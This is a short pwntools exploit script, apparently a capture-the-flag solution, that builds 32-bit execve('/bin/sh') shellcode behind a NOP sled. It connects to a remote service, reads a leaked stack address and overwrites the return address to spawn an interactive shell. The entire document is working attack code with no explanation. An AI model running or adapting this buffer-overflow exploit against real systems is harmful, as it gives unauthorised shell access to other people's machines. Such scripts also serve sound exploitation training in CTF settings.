from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

execve = """
    a:
    mov eax, 0x0b;
    pop ebx;
    mov ecx, 0;
    mov edx, 0;
    int 0x80;
"""
nope = 'nop;'*(8169)

payload = asm(execve + nope + 'call a;')

p = remote("plzpwn.me","3000")
p.recvuntil('address: ')

hexA = p.recv(10)
stack_address = int(hexA,16)

p.sendline(payload + "/bin/sh\0" + p32(stack_address))
p.interactive()

